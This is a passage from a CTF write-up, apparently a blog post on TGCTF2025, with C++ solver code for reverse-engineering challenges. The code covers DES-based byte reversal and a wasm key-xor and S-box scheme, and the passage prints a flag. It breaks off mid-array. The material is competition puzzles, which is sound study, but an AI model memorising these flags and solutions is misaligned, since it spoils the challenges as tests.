class="number">0x09221A0A</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> data[<span class="number">64</span>] = &#123;</span><br><span class="line">        <span class="number">0x00000084</span>, <span class="number">0x0000008B</span>, <span class="number">0x00000003</span>, <span class="number">0x00000022</span>, <span class="number">0x00000014</span>, <span class="number">0x000000BE</span>, <span class="number">0x000000DF</span>, <span class="number">0x00000075</span>,</span><br><span class="line">        <span class="number">0x000000B3</span>, <span class="number">0x000000D5</span>, <span class="number">0x00000076</span>, <span class="number">0x0000006F</span>, <span class="number">0x000000CD</span>, <span class="number">0x0000002A</span>, <span class="number">0x0000005D</span>, <span class="number">0x000000D7</span>,</span><br><span class="line">        <span class="number">0x0000004D</span>, <span class="number">0x000000B2</span>, <span class="number">0x0000005F</span>, <span class="number">0x00000006</span>, <span class="number">0x00000098</span>, <span class="number">0x0000009D</span>, <span class="number">0x0000003E</span>, <span class="number">0x000000A8</span>,</span><br><span class="line">        <span class="number">0x000000F7</span>, <span class="number">0x00000023</span>, <span class="number">0x000000F2</span>, <span class="number">0x0000008B</span>, <span class="number">0x000000F2</span>, <span class="number">0x00000054</span>, <span class="number">0x00000065</span>, <span class="number">0x0000007A</span>,</span><br><span class="line">        <span class="number">0x00000020</span>, <span class="number">0x000000C0</span>, <span class="number">0x00000087</span>, <span class="number">0x00000055</span>, <span class="number">0x000000D6</span>, <span class="number">0x0000003B</span>, <span class="number">0x00000046</span>, <span class="number">0x0000003D</span>,</span><br><span class="line">        <span class="number">0x000000F7</span>, <span class="number">0x000000B2</span>, <span class="number">0x0000007A</span>, <span class="number">0x0000009D</span>, <span class="number">0x000000C2</span>, <span class="number">0x000000CF</span>, <span class="number">0x0000001A</span>, <span class="number">0x000000AE</span>,</span><br><span class="line">        <span class="number">0x00000016</span>, <span class="number">0x000000C7</span>, <span class="number">0x00000015</span>, <span class="number">0x00000030</span>, <span class="number">0x0000008E</span>, <span class="number">0x000000FD</span>, <span class="number">0x0000008F</span>, <span class="number">0x0000009E</span>,</span><br><span class="line">        <span class="number">0x000000AA</span>, <span class="number">0x00000039</span>, <span class="number">0x000000AB</span>, <span class="number">0x000000FE</span>, <span class="number">0x00000095</span>, <span class="number">0x000000A7</span>, <span class="number">0x0000001F</span>, <span class="number">0x000000F1</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> Enc[<span class="number">64</span>]&#123;&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">64</span>; i++)</span><br><span class="line">        Enc[i] = data[i];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 四字节一组翻转</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">64</span>; i += <span class="number">4</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">auto</span> a = Enc[i], b = Enc[i + <span class="number">1</span>], c = Enc[i + <span class="number">2</span>], d = Enc[i + <span class="number">3</span>];</span><br><span class="line">        Enc[i] = d;</span><br><span class="line">        Enc[i + <span class="number">1</span>] = c;</span><br><span class="line">        Enc[i + <span class="number">2</span>] = b;</span><br><span class="line">        Enc[i + <span class="number">3</span>] = a;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// DES解密（用后32个key）</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">64</span>; i += <span class="number">8</span>)</span><br><span class="line">        <span class="built_in">des_encrypt</span>((<span class="type">unsigned</span> <span class="type">int</span> *)(Enc + i), (DWORD *)(key + <span class="number">32</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 四字节一组翻转</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">64</span>; i += <span class="number">4</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">auto</span> a = Enc[i], b = Enc[i + <span class="number">1</span>], c = Enc[i + <span class="number">2</span>], d = Enc[i + <span class="number">3</span>];</span><br><span class="line">        Enc[i] = d;</span><br><span class="line">        Enc[i + <span class="number">1</span>] = c;</span><br><span class="line">        Enc[i + <span class="number">2</span>] = b;</span><br><span class="line">        Enc[i + <span class="number">3</span>] = a;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;HZNUCTF&#123;&quot;</span>);</span><br><span class="line">    <span class="comment">// 逆向初始字符串变换</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">64</span>; i += <span class="number">4</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        std::string tmp1;</span><br><span class="line">        tmp1 += Enc[i];</span><br><span class="line">        tmp1 += Enc[i + <span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">        std::string tmp2;</span><br><span class="line">        tmp2 += Enc[i + <span class="number">1</span>];</span><br><span class="line">        tmp2 += Enc[i + <span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">char</span>(std::<span class="built_in">stoi</span>(tmp1, <span class="number">0</span>, <span class="number">16</span>)));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">char</span>(std::<span class="built_in">stoi</span>(tmp2, <span class="number">0</span>, <span class="number">16</span>)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&#125;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>HZNUCTF{391ds2b9-9e31-45f8-ba4a-4904a2d8}</p><h2 id="Index"><a href="#Index" class="headerlink" title="Index"></a>Index</h2><p>下载附件发现 wasm 文件开头字节和正常 wasm 文件不一样，复制修复即可。</p><p>左题目附件，右正常 wasm 文件。</p><p><img src="/2025/04/13/TGCTF2025/M9ZPbLMbioV3hrxarPMciS0dnbf.png"></p><p>使用 ghidra 进行分析，因为有专门的 wasm 反编译插件。</p><p>通过 Exports 定位到 main 函数，以下是经过我重命名后的结果。</p><p><img src="/2025/04/13/TGCTF2025/Mo4zbUXD1okZhqxZWYDcEm0vnId.png"></p><p>首先是输入 key，然后判断和该处明文是否相等。</p><p>然后将 Key xor 上 0x51。</p><p><img src="/2025/04/13/TGCTF2025/F4AZbPGRWodE4xxUffqcALrfnoe.png"></p><p><img src="/2025/04/13/TGCTF2025/Ua4PbQxeMo07WDxysZ8czeFMnff.png"></p><p>第一步加密，置了随机数种子 0x194，然后用随机数打乱输入的字符串，再转存到另一个 Out 数组。</p><p><img src="/2025/04/13/TGCTF2025/Ug0bbgaRVozqItxGyL8c8INnnhh.png"></p><p><img src="/2025/04/13/TGCTF2025/NXLdb6PLdouDr5xaFMDcw4OHnYv.png"></p><p>第二步加密（四个字节一组加密）：</p><ol><li>用 key 获取到两个值，然后全局数值 iRam0001120++，每次加密都 +1，初始值是 0。</li><li>调用一个函数将 0x10ea0 处数据异或上 0x10da0 取下标的对应值。</li><li>再将输入字符串异或上 0x10ea0 对应下标数据以及 0x11020 对应下标数据，0x11020 处数据就是原 Key 字符串**”TGCTF404”**。</li></ol><p><img src="/2025/04/13/TGCTF2025/ZjFubkmQ4ol6FRxwT4ic1yV0nrc.png"></p><p><img src="/2025/04/13/TGCTF2025/Qs5jbvWYtodwoExExOPcMX1CnSg.png"></p><p>最后再与 0x10fa0 处数据进行比对，所以 0x10fa0 处就是加密后的 flag。</p><p><img src="/2025/04/13/TGCTF2025/BisXbEousotrInxxm1DcQ0Yineb.png"></p><p>导出 0x10ea0 和 0x10da0 数据，编写以上代码的逆向解密代码即可。</p><p>解密代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 0x10da0处数据</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> box[] = &#123;</span><br><span class="line">    <span class="number">0x63</span>, <span class="number">0x7c</span>, <span class="number">0x77</span>, <span class="number">0x7b</span>, <span class="number">0xf2</span>, <span class="number">0x6b</span>, <span class="number">0x6f</span>, <span class="number">0xc5</span>,</span><br><span class="line">    <span class="number">0x30</span>, <span class="number">0x01</span>, <span class="number">0x67</span>, <span class="number">0x2b</span>, <span class="number">0xfe</span>, <span class="number">0xd7</span>, <span class="number">0xab</span>, <span class="number">0x76</span>,</span><br><span class="line">    <span class="number">0xca</span>, <span class="number">0x82</span>, <span class="number">0xc9</span>, <span class="number">0x7d</span>, <span class="number">0xfa</span>, <span class="number">0x59</span>, <span class="number">0x47</span>, <span class="number">0xf0</span>,</span><br><span class="line">    <span class="number">0xad</span>, <span class="number">0xd4</span>, <span class="number">0xa2</span>, <span class="number">0xaf</span>, <span class="number">0x9c</span>, <span class="number">0xa4</span>, <span class="number">0x72</span>, <span class="number">0xc0</span>,</span><br><span class="line">    <span class="number">0xb7</span>, <span class="number">0xfd</span>, <span class="number">0x93</span>, <span class="number">0x26</span>, <span class="number">0x36</span>, <span class="number">0x3f</span>, <span class="number">0xf7</span>, <span class="number">0xcc</span>,</span><br><span class="line">    <span class="number">0x34</span>, <span class="number">0xa5</span>, <span class="number">0xe5</span>, <span class="number">0xf1</span>, <span class="number">0x71</span>, <span class="number">0xd8</span>, <span class="number">0x31</span>, <span class="number">0x15</span>,</span><br><span class="line">    <span class="number">0x04</span>, <span class="number">0xc7</span>, <span class="number">0x23</span>, <span class="number">0xc3</span>, <span class="number">0x18</span>, <span class="number">0x96</span>, <span class="number">0x05</span>, <span class="number">0x9a</span>,</span><br><span class="line">    <span class="number">0x07</span>, <span class="number">0x12</span>, <span class="number">0x80</span>, <span class="number">0xe2</span>, <span class="number">0xeb</span>, <span class="number">0x27</span>, <span class="number">0xb2</span>, <span class="number">0x75</span>,</span><br><span class="line">    <span class="number">0x09</span>, <span class="number">0x83</span>, <span class="number">0x2c</span>, <span class="number">0x1a</span>, <span class="number">0x1b</span>, <span class="number">0x6e</span>, <span class="number">0x5a</span>, <span class="number">0xa0</span>,</span><br><span class="line">    <span class="number">0x52</span>, <span class="number">0x3b</span>, <span class="number">0xd6</span>, <span class="number">0xb3</span>, <span class="number">0x29</span>, <span class="number">0xe3</span>, <span class="number">0x2f</span>, <span class="number">0x84</span>,</span><br><span class="line">    <span class="number">0x53</span>, <span class="number">0xd1</span>, <span class="number">0x00</span>, <span class="number">0xed</span>, <span class="number">0x20</span>, <span class="number">0xfc</span>, <span class="number">0xb1</span>, <span class="number">0x5b</span>,</span><br><span class="line">    <span class="number">0x6a</span>, <span class="number">0xcb</span>, <span class="number">0xbe</span>, <span class="number">0x39</span>, <span class="number">0x4a</span>, <span class="number">0x4c</span>, <span class="number">0x58</span>, <span class="number">0xcf</span>,</span><br><span class="line">    <span class="number">0xd0</span>, <span class="number">0xef</span>, <span class="number">0xaa</span>, <span class="number">0xfb</span>, <span class="number">0x43</span>, <span class="number">0x4d</span>, <span class="number">0x33</span>, <span class="number">0x85</span>,</span><br><span class="line">    <span class="number">0x45</span>, <span class="number">0xf9</span>, <span class="number">0x02</span>, <span class="number">0x7f</span>, <span class="number">0x50</span>, <span class="number">0x3c</span>, <span class="number">0x9f</span>, <span class="number">0xa8</span>,</span><br><span class="line">    <span class="number">0x51</span>, <span class="number">0xa3</span>, <span class="number">0x40</span>, <span class="number">0x8f</span>, <span class="number">0x92</span>, <span class="number">0x9d</span>, <span class="number">0x38</span>, <span class="number">0xf5</span>,</span><br><span class="line">    <span class="number">0xbc</span>, <span class="number">0xb6</span>, <span class="number">0xda</span>, <span class="number">0x21</span>, <span class="number">0x10</span>, <span class="number">0xff</span>, <span class="number">0xf3</span>, <span class="number">0xd2</span>,</span><br><span class="line">    <span class="number">0xcd</span>, <span class="number">0x0c</span>, <span class="number">0x13</span>, <span class="number">0xec</span>, <span class="number">0x5f</span>, <span class="number">0x97</span>, <span class="number">0x44</span>, <span class="number">0x17</span>,</span><br><span class="line">    <span class="number">0xc4</span>, <span class="number">0xa7</span>, <span class="number">0x7e</span>, <span class="number">0x3d</span>, <span class="number">0x64</span>, <span class="number">0x5d</span>, <span class="number">0x19</span>, <span class="number">0x73</span>,</span><br><span class="line">    <span class="number">0x60</span>, <span class="number">0x81</span>, <span class="number">0x4f</span>, <span class="number">0xdc</span>, <span class="number">0x22</span>, <span class="number">0x2a</span>, <span class="number">0x90</span>, <span class="number">0x88</span>,</span><br><span class="line">    <span class="number">0x46</span>, <span class="number">0xee</span>, <span class="number">0xb8</span>, <span class="number">0x14</span>, <span class="number">0xde</span>, <span class="number">0x5e</span>, <span class="number">0x0b</span>, <span class="number">0xdb</span>,</span><br><span class="line">    <span class="number">0xe0</span>, <span class="number">0x32</span>, <span class="number">0x3a</span>, <span class="number">0x0a</span>, <span class="number">0x49</span>, <span class="number">0x06</span>, <span class="number">0x24</span>, <span class="number">0x5c</span>,</span><br><span class="line">    <span class="number">0xc2</span>, <span class="number">0xd3</span>, <span class="number">0xac</span>, <span class="number">0x62</span>, <span class="number">0x91</span>, <span class="number">0x95</span>, <span class="number">0xe4</span>, <span class="number">0x79</span>,</span><br><span class="line">    <span class="number">0xe7</span>, <span class="number">0xc8</span>, <span class="number">0x37</span>, <span class="number">0x6d</span>, <span class="number">0x8d</span>, <span class="number">0xd5</span>, <span class="number">0x4e</span>, <span class="number">0xa9</span>,</span><br><span class="line">    <span class="number">0x6c</span>, <span class="number">0x56</span>, <span class="number">0xf4</span>, <span class="number">0xea</span>, <span class="number">0x65</span>, <span class="number">0x7a</span>, <span class="number">0xae</span>, <span class="number">0x08</span>,</span><br><span class="line">    <span class="number">0xba</span>, <span class="number">0x78</span>, <span class="number">0x25</span>, <span class="number">0x2e</span>, <span class="number">0x1c</span>, <span class="number">0xa6</span>, <span class="number">0xb4</span>, <span class="number">0xc6</span>,</span><br><span class="line">    <span class="number">0xe8</span>, <span class="number">0xdd</span>, <span class="number">0x74</span>, <span class="number">0x1f</span>, <span class="number">0x4b</span>, <span class="number">0xbd</span>, <span class="number">0x8b</span>, <span class="number">0x8a</span>,</span><br><span class="line">    <span class="number">0x70</span>, <span class="number">0x3e</span>, <span class="number">0xb5</span>, <span class="number">0x66</span>, <span class="number">0x48</span>, <span class="number">0x03</span>, <span class="number">0xf6</span>, <span class="number">0x0e</span>,</span><br><span class="line">    <span class="number">0x61</span>, <span class="number">0x35</span>, <span class="number">0x57</span>, <span class="number">0xb9</span>, <span class="number">0x86</span>, <span class="number">0xc1</span>, <span class="number">0x1d</span>, <span class="number">0x9e</span>,</span><br><span class="line">    <span class="number">0xe1</span>, <span class="number">0xf8</span>, <span class="number">0x98</span>, <span class="number">0x11</span>, <span class="number">0x69</span>, <span class="number">0xd9</span>, <span class="number">0x8e</span>, <span class="number">0x94</span>,</span><br><span class="line">    <span class="number">0x9b</span>, <span class="number">0x1e</span>, <span class="number">0x87</span>, <span class="number">0xe9</span>, <span class="number">0xce</span>, <span class="number">0x55</span>, <span class="number">0x28</span>, <span class="number">0xdf</span>,</span><br><span class="line">    <span class="number">0x8c</span>, <span class="number">0xa1</span>, <span class="number">0x89</span>, <span class="number">0x0d</span>, <span class="number">0xbf</span>, <span class="number">0xe6</span>, <span class="number">0x42</span>, <span class="number">0x68</span>,</span><br><span class="line">    <span class="number">0x41</span>, <span class="number">0x99</span>, <span class="number">0x2d</span>, <span class="number">0x0f</span>, <span class="number">0xb0</span>, <span class="number">0x54</span>, <span class="number">0xbb</span>, <span class="number">0x16</span>&#125;;</span><br><span class="line">    </span><br><span class="line"><span class="comment">// 0x10ea0处数据</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> box_ori[] = &#123;</span><br><span class="line">    <span class="number">0xd6</span>, <span class="number">0x90</span>, <span class="number">0xe9</span>, <span class="number">0xfe</span>, <span class="number">0xcc</span>, <span class="number">0xe1</span>, <span class="number">0x3d</span>, <span class="number">0xb7</span>, <span class="number">0x16</span>, <span class="number">0xb6</span>, <span class="number">0x14</span>, <span class="number">0xc2</span>, <span class="number">0x28</span>, <span class="number">0xfb</span>, <span class="number">0x2c</span>, <span class="number">0x05</span>,</span><br><span class="line">    <span class="number">0x2b</span>, <span class="number">0x67</span>, <span class="number">0x9a</span>, <span class="number">0x76</span>, <span class="number">0x2a</span>, <span class="number">0xbe</span>, <span class="number">0x04</span>, <span class="number">0xc3</span>, <span class="number">0xaa</span>, <span class="number">0x44</span>, <span class="number">0x13</span>, <span class="number">0x26</span>, <span class="number">0x49</span>, <span class="number">0x86</span>, <span class="number">0x06</span>, <span class="number">0x99</span>,</span><br><span class="line">    <span class="number">0x9c</span>, <span class="number">0x42</span>, <span class="number">0x50</span>, <span class="number">0xf4</span>, <span class="number">0x91</span>, <span class="number">0xef</span>, <span class="number">0x98</span>, <span class="number">0x7a</span>, <span class="number">0x33</span>, <span class="number">0x54</span>, <span class="number">0x0b</span>, <span class="number">0x43</span>, <span class="number">0xed</span>, <span class="number">0xcf</span>, <span class="number">0xac</span>, <span class="number">0x62</span>,</span><br><span class="line">    <span class="number">0xe4</span>, <span class="number">0xb3</span>, <span class="number">0x1c</span>, <span class="number">0xa9</span>, <span class="number">0xc9</span>, <span class="number">0x08</span>, <span class="number">0xe8</span>, <span class="number">0x95</span>, <span class="number">0x80</span>, <span class="number">0xdf</span>, <span class="number">0x94</span>, <span class="number">0xfa</span>, <span class="number">0x75</span>, <span class="number">0x8f</span>, <span class="number">0x3f</span>, <span class="number">0xa6</span>,</span><br><span class="line">    <span class="number">0x47</span>, <span class="number">0x07</span>, <span class="number">0xa7</span>, <span class="number">0xfc</span>, <span class="number">0xf3</span>, <span class="number">0x73</span>, <span class="number">0x17</span>, <span class="number">0xba</span>, <span class="number">0x83</span>, <span class="number">0x59</span>, <span class="number">0x3c</span>, <span class="number">0x19</span>, <span class="number">0xe6</span>, <span class="number">0x85</span>, <span class="number">0x4f</span>, <span class="number">0xa8</span>,</span><br><span class="line">    <span class="number">0x68</span>, <span class="number">0x6b</span>, <span class="number">0x81</span>, <span class="number">0xb2</span>, <span class="number">0x71</span>, <span class="number">0x64</span>, <span class="number">0xda</span>, <span class="number">0x8b</span>, <span class="number">0xf8</span>, <span class="number">0xeb</span>, <span class="number">0x0f</span>, <span class="number">0x4b</span>, <span class="number">0x70</span>, <span class="number">0x56</span>, <span class="number">0x9d</span>, <span class="number">0x35</span>,</span><br><span class="line">    <span class="number">0x1e</span>, <span class="number">0x24</span>, <span class="number">0x0e</span>, <span class="number">0x5e</span>, <span class="number">0x63</span>, <span class="number">0x58</span>, <span class="number">0xd1</span>, <span class="number">0xa2</span>, <span class="number">0x25</span>, <span class="number">0x22</span>, <span class="number">0x7c</span>, <span class="number">0x3b</span>, <span class="number">0x01</span>, <span class="number">0x21</span>, <span class="number">0x78</span>, <span class="number">0x87</span>,</span><br><span class="line">    <span class="number">0xd4</span>, <span class="number">0x00</span>, <span class="number">0x46</span>, <span class="number">0x57</span>, <span class="number">0x9f</span>, <span class="number">0xd3</span>, <span class="number">0x27</span>, <span class="number">0x52</span>, <span class="number">0x4c</span>, <span class="number">0x36</span>, <span class="number">0x02</span>, <span class="number">0xe7</span>, <span class="number">0xa0</span>, <span class="number">0xc4</span>, <span class="number">0xc8</span>, <span class="number">0x9e</span>,</span><br><span class="line">    <span class="number">0xea</span>, <span class="number">0xbf</span>, <span class="number">0x8a</span>, <span class="number">0xd2</span>, <span class="number">0x40</span>, <span class="number">0xc7</span>, <span class="number">0x38</span>, <span class="number">0xb5</span>, <span class="number">0xa3</span>, <span class="number">0xf7</span>, <span class="number">0xf2</span>, <span class="number">0xce</span>, <span class="number">0xf9</span>, <span class="number">0x61</span>, <span class="number">0x15</span>, <span class="number">0xa1</span>,</span><br><span class="line">    <span class="number">0xe0</span>, <span class="number">0xae</span>, <span class="number">0x5d</span>, <span class="number">0xa4</span>, <span class="number">0x9b</span>, <span class="number">0x34</span>, <span class="number">0x1a</span>, <span class="number">0x55</span>, <span class="number">0xad</span>, <span class="number">0x93</span>, <span class="number">0x32</span>, <span class="number">0x30</span>, <span class="number">0xf5</span>, <span class="number">0x8c</span>, <span class="number">0xb1</span>, <span class="number">0xe3</span>,</span><br><span class="line">    <span class="number">0x1d</span>, <span class="number">0xf6</span>, <span class="number">0xe2</span>, <span class="number">0x2e</span>, <span class="number">0x82</span>, <span class="number">0x66</span>, <span class="number">0xca</span>, <span class="number">0x60</span>, <span class="number">0xc0</span>, <span class="number">0x29</span>, <span class="number">0x23</span>, <span class="number">0xab</span>, <span class="number">0x0d</span>, <span class="number">0x53</span>, <span class="number">0x4e</span>, <span class="number">0x6f</span>,</span><br><span class="line">    <span class="number">0xd5</span>, <span class="number">0xdb</span>, <span class="number">0x37</span>, <span class="number">0x45</span>, <span class="number">0xde</span>, <span class="number">0xfd</span>, <span class="number">0x8e</span>, <span class="number">0x2f</span>, <span class="number">0x03</span>, <span class="number">0xff</span>, <span class="number">0x6a</span>, <span class="number">0x72</span>, <span class="number">0x6d</span>, <span class="number">0x6c</span>, <span class="number">0x5b</span>, <span class="number">0x51</span>,</span><br><span class="line">    <span class="number">0x8d</span>, <span class="number">0x1b</span>, <span class="number">0xaf</span>, <span class="number">0x92</span>, <span class="number">0xbb</span>, <span class="number">0xdd</span>, <span class="number">0xbc</span>, <span class="number">0x7f</span>, <span class="number">0x11</span>, <span class="number">0xd9</span>, <span class="number">0x5c</span>, <span class="number">0x41</span>, <span class="number">0x1f</span>, <span class="number">0x10</span>, <span class="number">0x5a</span>, <span class="number">0xd8</span>,</span><br><span class="line">    <span class="number">0x0a</span>, <span class="number">0xc1</span>, <span class="number">0x31</span>, <span class="number">0x88</span>, <span class="number">0xa5</span>, <span class="number">0xcd</span>, <span class="number">0x7b</span>, <span class="number">0xbd</span>, <span class="number">0x2d</span>, <span class="number">0x74</span>, <span class="number">0xd0</span>, <span class="number">0x12</span>, <span class="number">0xb8</span>, <span class="number">0xe5</span>, <span class="number">0xb4</span>, <span class="number">0xb0</span>,</span><br><span class="line">    <span class="number">0x89</span>, <span class="number">0x69</span>, <span class="number">0x97</span>, <span class="number">0x4a</span>, <span class="number">0x0c</span>, <span class="number">0x96</span>, <span class="number">0x77</span>, <span class="number">0x7e</span>, <span class="number">0x65</span>, <span class="number">0xb9</span>, <span class="number">0xf1</span>, <span class="number">0x09</span>, <span class="number">0xc5</span>, <span class="number">0x6e</span>, <span class="number">0xc6</span>, <span class="number">0x84</span>,</span><br><span class="line">    <span class="number">0x18</span>, <span class="number">0xf0</span>, <span class="number">0x7d</span>, <span class="number">0xec</span>, <span class="number">0x3a</span>, <span class="number">0xdc</span>, <span class="number">0x4d</span>, <span class="number">0x20</span>, <span class="number">0x79</span>, <span class="number">0xee</span>, <span class="number">0x5f</span>, <span class="number">0x3e</span>, <span class="number">0xd7</span>, <span class="number">0xcb</span>, <span class="number">0x39</span>, <span class="number">0x48</span>&#125;;</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">unnamed_function_10</span><span class="params">(byte *_param1_, <span class="type">int</span> _param2_)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100</span>; i = i + <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        _param1_[i] = _param1_[i] ^ (byte)_param2_;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> Enc[] = &#123;</span><br><span class="line">    <span class="number">0x84</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x1c</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x6b</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xf7</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x49</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xd6</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x42</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x50</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x7b</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x42</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xf4</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x46</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xa9</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x83</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x62</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xd1</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span 